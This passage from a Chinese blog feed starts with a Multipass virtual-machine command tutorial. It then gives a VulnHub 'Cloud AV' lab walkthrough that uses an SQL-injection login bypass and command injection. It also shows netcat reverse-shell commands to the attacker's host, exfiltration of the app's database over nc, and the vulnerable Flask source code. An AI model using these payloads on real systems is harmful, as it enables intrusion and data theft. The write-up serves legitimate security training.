class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Usage: multipass [options] &lt;command&gt;</span><br><span class="line">Create, control and connect to Ubuntu instances.</span><br><span class="line"></span><br><span class="line">This is a command line utility for multipass, a</span><br><span class="line">service that manages Ubuntu instances.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -h, --help     Displays help on commandline options.</span><br><span class="line">  --help-all     Displays help including Qt specific options.</span><br><span class="line">  -v, --verbose  Increase logging verbosity. Repeat the &#x27;v&#x27; in the short option</span><br><span class="line">                 for more detail. Maximum verbosity is obtained with 4 (or more)</span><br><span class="line">                 v&#x27;s, i.e. -vvvv.</span><br><span class="line"></span><br><span class="line">Available commands:</span><br><span class="line">  alias     Create an alias</span><br><span class="line">  aliases   List available aliases</span><br><span class="line">  delete    Delete instances</span><br><span class="line">  exec      Run a command on an instance</span><br><span class="line">  find      Display available images to create instances from</span><br><span class="line">  get       Get a configuration setting</span><br><span class="line">  help      Display help about a command</span><br><span class="line">  info      Display information about instances</span><br><span class="line">  launch    Create and start an Ubuntu instance</span><br><span class="line">  list      List all available instances</span><br><span class="line">  mount     Mount a local directory in the instance</span><br><span class="line">  networks  List available network interfaces</span><br><span class="line">  purge     Purge all deleted instances permanently</span><br><span class="line">  recover   Recover deleted instances</span><br><span class="line">  restart   Restart instances</span><br><span class="line">  set       Set a configuration setting</span><br><span class="line">  shell     Open a shell on a running instance</span><br><span class="line">  start     Start instances</span><br><span class="line">  stop      Stop running instances</span><br><span class="line">  suspend   Suspend running instances</span><br><span class="line">  transfer  Transfer files between the host and instances</span><br><span class="line">  umount    Unmount a directory from an instance</span><br><span class="line">  unalias   Remove an alias</span><br><span class="line">  version   Show version details</span><br></pre></td></tr></table></figure><h3 id="查看正在运行的Multipass版本"><a href="#查看正在运行的Multipass版本" class="headerlink" title="查看正在运行的Multipass版本"></a>查看正在运行的<strong>Multipass</strong>版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass version</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">multipass   1.8.1+mac</span><br><span class="line">multipassd  1.8.1+mac</span><br></pre></td></tr></table></figure><h3 id="快速创建运行"><a href="#快速创建运行" class="headerlink" title="快速创建运行"></a>快速创建运行</h3><p>打开<strong>Multipass</strong>–打开<strong>状态栏图标</strong>–<strong>Open Shell</strong></p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220124102731263.png" alt="image-20220124102731263"></p><h3 id="查看可下载安装的Ubuntu镜像"><a href="#查看可下载安装的Ubuntu镜像" class="headerlink" title="查看可下载安装的Ubuntu镜像"></a>查看可下载安装的Ubuntu镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass find</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Image                       Aliases           Version          Description</span><br><span class="line">18.04                       bionic            20220104         Ubuntu 18.04 LTS</span><br><span class="line">20.04                       focal,lts         20220118         Ubuntu 20.04 LTS</span><br><span class="line">21.10                       impish            20220118         Ubuntu 21.10</span><br><span class="line">anbox-cloud-appliance                         latest           Anbox Cloud Appliance</span><br><span class="line">charm-dev                                     latest           A development and testing environment for charmers</span><br><span class="line">minikube                                      latest           minikube is local Kubernetes</span><br></pre></td></tr></table></figure><h3 id="下载镜像配置并运行"><a href="#下载镜像配置并运行" class="headerlink" title="下载镜像配置并运行"></a>下载镜像配置并运行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass launch -n vm01 -c 1 -m 1G -d 10G</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-n, --name: 名称</span><br><span class="line">-c, --cpus: cpu核心数, 默认: 1</span><br><span class="line">-m, --mem: 内存大小, 默认: 1G</span><br><span class="line">-d, --disk: 硬盘大小, 默认: 5G</span><br></pre></td></tr></table></figure><h3 id="查看虚拟机列表"><a href="#查看虚拟机列表" class="headerlink" title="查看虚拟机列表"></a>查看虚拟机列表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass list</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Name                    State             IPv4             Image</span><br><span class="line">primary                 Running           192.168.64.2     Ubuntu 20.04 LTS</span><br><span class="line">vm01                    Running           192.168.64.3     Ubuntu 20.04 LTS</span><br></pre></td></tr></table></figure><h3 id="查看虚拟机信息"><a href="#查看虚拟机信息" class="headerlink" title="查看虚拟机信息"></a>查看虚拟机信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass info vm01</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Name:           vm01</span><br><span class="line">State:          Running</span><br><span class="line">IPv4:           192.168.64.3</span><br><span class="line">Release:        Ubuntu 20.04.3 LTS</span><br><span class="line">Image hash:     6fbeb622aace (Ubuntu 20.04 LTS)</span><br><span class="line">Load:           0.41 0.14 0.05</span><br><span class="line">Disk usage:     1.2G out of 9.5G</span><br><span class="line">Memory usage:   135.0M out of 970.0M</span><br><span class="line">Mounts:         --</span><br></pre></td></tr></table></figure><h3 id="在虚拟机外部执行命令"><a href="#在虚拟机外部执行命令" class="headerlink" title="在虚拟机外部执行命令"></a>在虚拟机外部执行命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass <span class="built_in">exec</span> vm01 <span class="built_in">pwd</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/ubuntu</span><br></pre></td></tr></table></figure><h3 id="进入虚拟机"><a href="#进入虚拟机" class="headerlink" title="进入虚拟机"></a>进入虚拟机</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass shell vm01</span><br></pre></td></tr></table></figure><p>成功进入终端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@vm01:~$</span><br></pre></td></tr></table></figure><h3 id="宿主机挂载虚拟机"><a href="#宿主机挂载虚拟机" class="headerlink" title="宿主机挂载虚拟机"></a>宿主机挂载虚拟机</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass mount /mnt vm01:/mnt</span><br></pre></td></tr></table></figure><h3 id="宿主机卸载虚拟机挂载"><a href="#宿主机卸载虚拟机挂载" class="headerlink" title="宿主机卸载虚拟机挂载"></a>宿主机卸载虚拟机挂载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass unmount vm01</span><br></pre></td></tr></table></figure><h3 id="重启虚拟机"><a href="#重启虚拟机" class="headerlink" title="重启虚拟机"></a>重启虚拟机</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass restart vm01</span><br></pre></td></tr></table></figure><h3 id="删除虚拟机"><a href="#删除虚拟机" class="headerlink" title="删除虚拟机"></a>删除虚拟机</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$multipass</span> delete vm01</span><br><span class="line"><span class="variable">$multipass</span> delete --purge vm01 彻底删除</span><br></pre></td></tr></table></figure><h3 id="恢复删除虚拟机"><a href="#恢复删除虚拟机" class="headerlink" title="恢复删除虚拟机"></a>恢复删除虚拟机</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass recover vm01 </span><br></pre></td></tr></table></figure><h3 id="暂停虚拟机"><a href="#暂停虚拟机" class="headerlink" title="暂停虚拟机"></a>暂停虚拟机</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass stop ubuntu-lts</span><br></pre></td></tr></table></figure><h3 id="启动虚拟机"><a href="#启动虚拟机" class="headerlink" title="启动虚拟机"></a>启动虚拟机</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass start vm01</span><br></pre></td></tr></table></figure><h3 id="挂起虚拟机"><a href="#挂起虚拟机" class="headerlink" title="挂起虚拟机"></a>挂起虚拟机</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass <span class="built_in">suspend</span> vm01 </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;一、Multipass介绍&quot;&gt;&lt;a href=&quot;#一、Multipass介绍&quot; class=&quot;headerlink&quot; title=&quot;一、Multipass介绍&quot;&gt;&lt;/a&gt;一、Multipass介绍&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Multipass&lt;/strong&gt; 是您工作站上的迷你云，使用所有受支持平台（Windows、macOS 和 Linux）的本机管理程序，只需单击（“打开 shell”）或简单&lt;code&gt;multipass shell&lt;/code&gt;命令，它就会为您提供 Ubuntu 命令行，甚至键盘快捷键。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Multipass&lt;/strong&gt; 是一个轻量虚拟机管理器，是由 &lt;strong&gt;Ubuntu&lt;/strong&gt; 运营公司 &lt;strong&gt;Canonical&lt;/strong&gt; 所推出的开源项目。运行环境支持 &lt;strong&gt;Linux&lt;/strong&gt;、&lt;strong&gt;Windows&lt;/strong&gt;、&lt;strong&gt;macOS&lt;/strong&gt;。在不同的操作系统上，使用的是不同的虚拟化技术。在 &lt;strong&gt;Linux&lt;/strong&gt; 上使用的是 &lt;strong&gt;KVM&lt;/strong&gt;、&lt;strong&gt;Window&lt;/strong&gt; 上使用 &lt;strong&gt;Hyper-V&lt;/strong&gt;、&lt;strong&gt;macOS&lt;/strong&gt; 中使用 &lt;strong&gt;HyperKit&lt;/strong&gt; 以最小开销运行VM，支持在笔记本模拟小型云。&lt;/p&gt;
&lt;p&gt;同时，&lt;strong&gt;Multipass&lt;/strong&gt; 提供了一个命令行界面来启动和管理 &lt;strong&gt;Linux&lt;/strong&gt; 实例。下载一个全新的镜像需要几秒钟的时间，并且在几分钟内就可以启动并运行 &lt;strong&gt;VM&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220124102540386.png&quot; alt=&quot;image-20220124102540386&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>VulnHub-2-BoredHackerBlog:Cloud AV</title>
    <link href="http://example.com/2022/04/12/week2/"/>
    <id>http://example.com/2022/04/12/week2/</id>
    <published>2022-04-12T07:08:54.963Z</published>
    <updated>2022-04-12T07:10:28.764Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>Name:</strong> BoredHackerBlog: Cloud AV</p><p><strong>Date release:</strong> 29 Mar 2020</p><p><strong>Author</strong>: <a href="https://www.vulnhub.com/author/boredhackerblog,683/">BoredHackerBlog</a></p><p><strong>Series</strong>: <a href="https://www.vulnhub.com/series/boredhackerblog,295/">BoredHackerBlog</a></p><p><strong>Download：</strong><a href="https://download.vulnhub.com/boredhackerblog/easy_cloudantivirus.ova">https://download.vulnhub.com/boredhackerblog/easy_cloudantivirus.ova</a></p><p><strong>Description:</strong></p><p>Cloud Anti-Virus Scanner! is a cloud-based antivirus scanning service.</p><p>Currently, it’s in beta mode. You’ve been asked to test the setup and find vulnerabilities and escalate privs.</p><p><strong>Difficulty:</strong> Easy</p><p><strong>Tasks involved:</strong></p><ul><li>port scanning</li><li>webapp attacks</li><li>sql injection</li><li>command injection</li><li>brute forcing</li><li>code analysis</li></ul><p><strong>Virtual Machine:</strong></p><ul><li>Format: Virtual Machine (Virtualbox OVA)</li><li>Operating System: Linux</li></ul><p><strong>Networking:</strong></p><ul><li>DHCP Service: Enabled</li><li>IP Address Automatically assign</li></ul><p>This works better with VirtualBox rather than VMware.</p></blockquote><span id="more"></span><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009095714305.png" alt="image-20211009095714305"></p><p>kali的IP为10.0.2.4</p><p>对10.0.2.0&#x2F;24网段内的IP发送包进行探测发现<img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009095857623.png" alt="image-20211009095857623"></p><p>10.0.2.7<strong>返回数据</strong>，说明<strong>存活</strong></p><h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.7</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009101228440.png" alt="image-20211009101228440"></p><p>结果显示目标靶机<strong>开放了22,8080端口</strong></p><h3 id="3-端口服务扫描发现"><a href="#3-端口服务扫描发现" class="headerlink" title="3.端口服务扫描发现"></a>3.端口服务扫描发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p22,8080 -sV 10.0.2.7</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009101354083.png" alt="image-20211009101354083"></p><p>目标系统为Ubuntu 且开放了22端口为<strong>SSH服务</strong></p><p>8080端口的Werkzeug是基于Python2.7环境</p><p>补充：Werkzeug是一个WSGI工具包，Werkzeug可以作为一个 Web 框架的底层库，因为它封装好了很多 Web 框架的东西，例如 Request，Response 等等。如 Flask 框架就是以Werkzeug 为基础开发的。</p><h2 id="二、漏洞发现与利用"><a href="#二、漏洞发现与利用" class="headerlink" title="二、漏洞发现与利用"></a>二、漏洞发现与利用</h2><h3 id="1-访问页面"><a href="#1-访问页面" class="headerlink" title="1.访问页面"></a>1.访问页面</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问：http://10.0.10.7:8080</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009102035206.png" alt="image-20211009102035206"></p><p>页面如图为“云防病毒平台”，并提示需提交邀请码才能登录使用</p><p>那么如何突破这个页面？</p><h3 id="2-测试SQL注入-x2F-爆破"><a href="#2-测试SQL注入-x2F-爆破" class="headerlink" title="2.测试SQL注入&#x2F;爆破"></a>2.测试SQL注入&#x2F;爆破</h3><p>尝试在页面文本框内<strong>提交信息（特殊符号）</strong>来服务端后端有没有对用户提交的<strong>敏感字符</strong>（不同语言环境下存在不同作用&#x2F;意义的字符）进行过滤，若未过滤则有可能<strong>发生报错</strong>或会<strong>返回错误信息</strong>。</p><p>配置浏览器代理，使用BurpSuite对<strong>符号</strong>进行检测</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009103133428.png" alt="image-20211009103133428"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009104716945.png" alt="image-20211009104716945"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009104651517.png" alt="image-20211009104651517"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009104834953.png" alt="image-20211009104834953"></p><p>对页面进行测试后，<strong>通过长度判断</strong>，发现输入双引号(“)可能产生了闭合，改变原语句执行语义，导致报错，报错页面如下图，<strong>判断存在注入漏洞</strong></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009105012567.png" alt="image-20211009105012567"></p><p>发现报错页面存在<strong>疑似查询语句</strong></p><p>‘select * from code where password&#x3D;”‘ + password + ‘“‘</p><p>省去单引号</p><p>select * from code where password&#x3D;” + password + “</p><p>尝试通过此语句构造payload</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009105106411.png" alt="image-20211009105106411"></p><p>输入**1” or 1&#x3D;1–+**提交后成功利用注入漏洞跨过了“invite code”验证，进入“云防病毒平台”页面</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009105148438.png" alt="image-20211009105148438"></p><h3 id="3-命令注入"><a href="#3-命令注入" class="headerlink" title="3.命令注入"></a>3.命令注入</h3><p>可以发现这个页面的所显示的信息是ls -l命令执行的结果，在结合页面下的”File Name”文本框 和”Scan!”提交按钮，可以联想到页面背后的功能实现过程大概是一个“病毒攻击&#x2F;平台”对文件扫描的功能，代码逻辑可能类似如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxScanner 文件名</span><br></pre></td></tr></table></figure><p>那么是否可以产生使用<strong>管道符（|）</strong>连接执行其他命令呢？下面进行尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello | ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009142912228.png" alt="image-20211009142912228"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello | id</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009142744487.png" alt="image-20211009142744487"></p><p>在等待服务端响应后，确实执行了ls和id，并在页面返回了相应的结果，即<strong>存在命令注入漏洞</strong>，那么是否可以反弹shell？</p><p>思路1：结合先前扫描结果，可以得到目标系统的语言环境是Python2.7.15，故可以利用Python反弹shell</p><p>思路2：利用nc反弹shell</p><p>(为了学习更多的攻击方法，选用思路2)</p><h3 id="4-使用nc建立连接"><a href="#4-使用nc建立连接" class="headerlink" title="4.使用nc建立连接"></a>4.使用nc建立连接</h3><p>确认目标系统<strong>是否存在nc</strong>命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello | which nc</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009143025187.png" alt="image-20211009143025187"></p><p>补充：**| 表示管道符，上一条命令的输出，作为下一条命令参数**</p><p>目标系统<strong>存在nc</strong>命令，可正常进行后续操作</p><p>在Kali端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009143140893.png" alt="image-20211009143140893"></p><p>确认Kali地址为10.0.2.4</p><p>nc监听端口4444</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009143219519.png" alt="image-20211009143219519"></p><p>在浏览器端：</p><p>使用nc反弹连接kali端的监听，在实验-e参数执行一个shell终端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello | nc 10.0.2.4 4444 -e /bin/sh</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009143635524.png" alt="image-20211009143635524"></p><p>执行后，并没有监听端口成功连接，怀疑该系统的系统版本下的nc<strong>不支持-e参数</strong>，所以这里我们先去除-e参数，尝试连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello | nc 10.0.2.4 4444 </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211011150457393.png" alt="image-20211011150457393"></p><p>成功建立连接，尝试输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009145019507.png" alt="image-20211009145019507"></p><p>结果发现不能执行来返回结果</p><p>故<strong>采用多个</strong>管道符（|），此法暂且称为“<strong>nc管道符串联</strong>”</p><p>在Kali上同时监听5555和6666端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 5555</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 6666</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009145202343.png" alt="image-20211009145202343"></p><p>在浏览器端 采用“nc管道符串联”：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello | nc 10.0.2.4 5555 | /bin/bash | nc 10.0.2.4 6666 </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009145552070.png" alt="image-20211009145552070"></p><p>kali端显示两个端口都成功连接</p><h3 id="5-信息收集-x2F-ssh爆破"><a href="#5-信息收集-x2F-ssh爆破" class="headerlink" title="5.信息收集&#x2F;ssh爆破"></a>5.信息收集&#x2F;ssh爆破</h3><p>尝试在5555端口监听窗口输入命令，发现执行结果会在6666端口监听窗口显示，成功</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009145754300.png" alt="image-20211009145754300"></p><p>登录到目标系统后，查看文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009151033812.png" alt="image-20211009151033812"></p><p>查看app.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat app.py</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009151112767.png" alt="image-20211009151112767"></p><blockquote><p>from flask import Flask, render_template, request, session<br>import sqlite3<br>import subprocess<br>import os</p><p>conn &#x3D; sqlite3.connect(‘database.sql’,check_same_thread &#x3D; False)<br>c &#x3D; conn.cursor()</p><p>app &#x3D; Flask(<strong>name</strong>)</p><p>@app.route(‘&#x2F;‘)<br>def index():<br>   return render_template(‘index.html’)</p><p>@app.route(‘&#x2F;login’, methods&#x3D;[‘POST’])<br>def login():<br>   password &#x3D; request.form[‘password’]<br>   if len(c.execute(‘select * from code where password&#x3D;”‘ + password + ‘“‘).fetchall()) &gt; 0:<br>       session[‘logged_in’] &#x3D; True<br>       return ‘Redirecting to &#x2F;scan. <meta http-equiv="refresh" content="0; url=/scan" />‘<br>   else:<br>       return “WRONG INFORMATION”</p><p>@app.route(‘&#x2F;scan’)<br>def shop():<br>   if session.get(‘logged_in’):<br>       filelist &#x3D; subprocess.Popen(“ls -l &#x2F;home&#x2F;scanner&#x2F;cloudav_app&#x2F;samples”, shell&#x3D;True, stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.PIPE, stdin&#x3D;subprocess.PIPE).stdout.read()<br>       return render_template(‘scan.html’,filelist&#x3D;filelist)<br>   else:<br>       return ‘<meta http-equiv="refresh" content="0; url=/" />‘</p><p>@app.route(‘&#x2F;output’, methods&#x3D;[‘POST’])<br>def output():<br>   if session.get(‘logged_in’):<br>       filename &#x3D; request.form[‘filename’]<br>       scan_results &#x3D; subprocess.Popen(“clamscan “+filename, shell&#x3D;True, stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.PIPE, stdin&#x3D;subprocess.PIPE).stdout.read()<br>       return “<pre>" + scan_results + "</pre>“<br>   else:<br>       return ‘<meta http-equiv="refresh" content="0; url=/" />‘</p><p>if <strong>name</strong> &#x3D;&#x3D; “<strong>main</strong>“:<br>   app.secret_key &#x3D; os.urandom(12)<br>   app.run(host&#x3D;’0.0.0.0’,port&#x3D;8080, debug&#x3D;True)</p></blockquote><p>app.py中并没有可以直接有关提权的信息</p><p>查看database.sql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file database.sql</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009151631066.png" alt="image-20211009151631066"></p><p>发现数据库版本信息SQLite 3.x，再结合之前sql注入时的页面返回信息</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009152025908.png" alt="image-20211009152025908"></p><p>版本信息一致，猜测是Web应用程序服务端的数据库，有可能有隐私数据，所以就有必要查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlite</span><br></pre></td></tr></table></figure><p>尝试执行发现没有相关指令</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009151902078.png" alt="image-20211009151902078"></p><p>即<strong>服务端无法解析</strong>sqlite文件，那是否可以将下载到kali本机上，使用kali本机上sqlite的执行环节来查看文件database.sql</p><p>在Kali端新窗口开启nc监听7777端口，将接收到的所有<strong>连接请求都转发到</strong>db.sql文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777 &gt; db.sql</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009152136352.png" alt="image-20211009152136352"></p><p>在监听5555端口的窗口内，连接10.0.2.4（kali）的7777端口<strong>再通过重定向</strong>将database.sql传输到nc通道内</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.0.2.4 7777 &lt; database.sql</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009152503151.png" alt="image-20211009152503151"></p><p>database.sql文件不大，很快传输完Ctrl+C结束</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009152617144.png" alt="image-20211009152617144"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009152646495.png" alt="image-20211009152646495"></p><p>使用kali的sqlite3环境下查看db.sql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlite3</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.open db.sql</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.database</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.dump</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009152831159.png" 